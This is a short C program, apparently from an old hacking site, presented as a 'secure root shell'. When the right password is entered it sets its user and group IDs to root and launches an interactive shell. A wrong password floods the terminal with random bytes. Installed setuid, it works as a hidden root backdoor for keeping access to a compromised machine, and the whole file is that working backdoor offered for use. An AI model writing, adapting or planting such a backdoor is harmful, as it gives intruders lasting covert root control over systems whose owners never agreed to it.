/*
 * SeCshell.c
 *
 * Secure root shell, protected by standard DES encryption.
 *
 *
 * Pir8@dtors.net ~~ www.dtors.net
 *
 */


#include <stdlib.h>
#include <string.h>
#define PWD "uXO1k5bPFzFhk" /* standard DES */
int main() { /* Lets start the program */

	char *crypted=PWD;
	char *pass; /* variable for passwd */

	pass = (char *)getpass ("Password: "); /* lets get users pass */

	if (strcmp(crypt(pass,crypted),crypted)) { /* lets see if the pass entered matches */

		printf("SeCshell Protected.\n"); /* display text */
		sleep(3); /* rest for 3 secs */
		system("/bin/cat /dev/urandom"); /* Flood users Terminal */
		exit(1);
	}
	
	else 
	{
		setuid(0); /* remove this line if you dont want to get a root shell */
		setgid(0); /* remove this line if you dont want to get a root shell */
		execl("/bin/sh","sh -i",0); /* Execute shell */
	}
return 0;
}

